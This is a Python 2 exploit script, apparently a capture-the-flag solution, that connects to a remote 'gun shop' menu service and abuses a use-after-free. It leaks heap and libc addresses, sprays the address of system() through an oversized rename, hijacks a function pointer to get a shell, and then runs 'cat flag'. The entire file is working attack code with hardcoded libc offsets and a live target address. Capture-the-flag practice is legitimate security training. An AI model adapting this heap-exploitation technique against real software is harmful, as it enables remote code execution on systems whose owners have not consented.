import socket, struct, os, binascii, base64
import telnetlib   

def readline(sc, show = True):
    res = ""
    while len(res) == 0 or res[-1] != "\n":
        data = sc.recv(1)
        if len(data) == 0:
            print repr(res)
            raise Exception("Server disconnected")
        res += data
        
    if show:
        print repr(res[:-1])
    return res[:-1]

def read_until(sc, s):
    res = ""
    while not res.endswith(s):
        data = sc.recv(1)
        if len(data) == 0:
            print repr(res)
            raise Exception("Server disconnected")
        res += data
        
    return res[:-(len(s))]
    
def read_all(sc, n):
    data = ""
    while len(data) < n:
        block = sc.recv(n - len(data))
        if len(block) == 0:
            print repr(data)
            raise Exception("Server disconnected")
        data += block

    return data

def I(n):
    return struct.pack("<I", n)
    
def Q(n):
    return struct.pack("<Q", n)

def buy_gun(kind, namesize, name):
    sc.send("1\n")
    sc.send(str(kind) + "\n")
    sc.send(str(namesize) + "\n")
    sc.send(name + "\n")

def select_gun(index):
    sc.send("2\n")
    sc.send(str(index) + "\n")
    
def list_guns():
    sc.send("3\n")
    
def rename_gun(index, namesize, name):
    sc.send("4\n")
    sc.send(str(index) + "\n")
    sc.send(str(namesize) + "\n")
    sc.send(name + "\n")
    
def shoot_gun():
    sc.send("5\n")
    sc.send("1\n")
    sc.send("4\n")
    
def drop_gun(index):
    sc.send("6\n")
    sc.send(str(index) + "\n")
    
sc = socket.create_connection(("202.112.51.247", 3456))
sc.send("team token goes here\n")
libc_offset = 0x001B27B0
environ_offset = 0x001B3DBC
canary_offset = 0xdf
system_offset = 0x0003ADA0

# sc = socket.create_connection(("10.0.0.52", 12345))
# libc_offset = 0x001613F0
# environ_offset = 0x00161D64
# bin_offset = 0xe0
# canary_offset = 0xef
# system_offset = 0x0003C000

buy_gun(1, 127, "a" * 127)
buy_gun(1, 127, "b" * 127)
buy_gun(1, 127, "c" * 127)
select_gun(0)
drop_gun(0)

sc.send("5\n")
read_until(sc, "Select gun ")
res = readline(sc)
addr_a, addr_b = struct.unpack("<II", res[0:8])
libc_base = addr_a - libc_offset

print hex(libc_base)
sc.send("4\n")

rename_gun(1, 15, "xxxx" + I(addr_a))

sc.send("5\n")
read_until(sc, "Select gun ")
res = readline(sc)
addr_c = struct.unpack("<I", res[0:4])[0]
print hex(addr_c)
sc.send("4\n")

rename_gun(1, 15, "d" * 15)
rename_gun(2, 0x400000, "XXX" + I(libc_base + system_offset) * 0x3ffff)
rename_gun(1, 15, "xxxx" + I(addr_c-0x94))

sc.send("5\n")
read_until(sc, "Select gun ")
res = readline(sc, False)
addr_mmap = struct.unpack("<I", res[0:4])[0]
print hex(addr_mmap)
sc.send("4\n")

target = (addr_mmap & 0xff000000) + 0x1006873

rename_gun(1, 15, "d" * 15)
rename_gun(1, 15, I(target) * 2)

sc.send("5\n")
read_until(sc, "Select gun ")
res = readline(sc, False)

sc.send("1\n")

sc.send("cat flag\n")

while True:
    data = sc.recv(16384)
    if len(data) == 0:
        break
    for line in data.split("\n"):
        print repr(line)
    